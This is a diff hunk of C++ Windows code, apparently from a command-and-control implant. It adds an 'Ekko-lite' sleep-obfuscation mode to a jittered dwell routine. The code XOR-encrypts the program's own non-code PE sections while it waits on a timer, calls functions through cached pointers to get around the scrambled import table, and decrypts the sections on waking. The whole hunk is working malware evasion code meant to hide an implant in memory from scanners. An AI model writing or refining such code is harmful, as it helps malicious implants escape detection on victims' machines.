@@ -271,28 +271,44 @@ BOOL ObfuscatedDwell(ULONG base_ms, ULONG jitter_ms)
     due.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
 
 #if CONFIG_SLEEP_OBFUSCATION_TYPE == 2
-    // ---- Ekko-lite: XOR sections before wait ------------------------------
+    // ---- Ekko-lite: cache IAT-resolved pointers BEFORE XOR ----------------
+    // _XorPeSections scrambles every non-.text section, including .rdata and
+    // .idata where the Import Address Table lives.  Any call through an IAT
+    // thunk after XOR dereferences a garbage pointer and crashes.
+    // Copying the resolved VAs to the stack bypasses the corrupted thunks for
+    // the duration of the dwell window.
+    typedef DWORD (WINAPI *pfnWFSO)(HANDLE, DWORD);
+    typedef BOOL  (WINAPI *pfnCH)(HANDLE);
+    pfnWFSO _WaitForSingleObject = (pfnWFSO)WaitForSingleObject;
+    pfnCH   _CloseHandle         = (pfnCH)CloseHandle;
+
+    // Arm the timer BEFORE encrypting so SetWaitableTimer uses the clean IAT.
+    SetWaitableTimer(hTimer, &due, 0, nullptr, nullptr, FALSE);
+
+    // Derive key and encrypt non-.text sections.
     BYTE xor_key[16] = {};
     _DeriveXorKey(xor_key);
-
-    // GetModuleHandleA(nullptr) returns our own module base without PEB walk.
     HMODULE hSelf = GetModuleHandleA(nullptr);
     _XorPeSections(hSelf, xor_key, sizeof(xor_key));
-#endif
 
-    // ---- Wait --------------------------------------------------------------
+    // ---- Wait via cached pointer (no IAT dereference) ---------------------
+    _WaitForSingleObject(hTimer, INFINITE);
+
+    // ---- Ekko-lite: XOR sections after wake (decrypt) ---------------------
+    _XorPeSections(hSelf, xor_key, sizeof(xor_key));
+    SecureZeroMemory(xor_key, sizeof(xor_key));
+
+    // IAT is restored; safe to use normal call.
+    _CloseHandle(hTimer);
+    return TRUE;
+
+#else
+    // ---- Mode 1: plain WaitableTimer wait (no section XOR) ----------------
     SetWaitableTimer(hTimer, &due, 0, nullptr, nullptr, FALSE);
     WaitForSingleObject(hTimer, INFINITE);
     CloseHandle(hTimer);
-
-#if CONFIG_SLEEP_OBFUSCATION_TYPE == 2
-    // ---- Ekko-lite: XOR sections after wake (decrypt) ---------------------
-    // XOR with the same key is self-inverse - restores original bytes.
-    _XorPeSections(hSelf, xor_key, sizeof(xor_key));
-    SecureZeroMemory(xor_key, sizeof(xor_key));
-#endif
-
     return TRUE;
+#endif
 
 #endif // CONFIG_SLEEP_OBFUSCATION_TYPE
 }
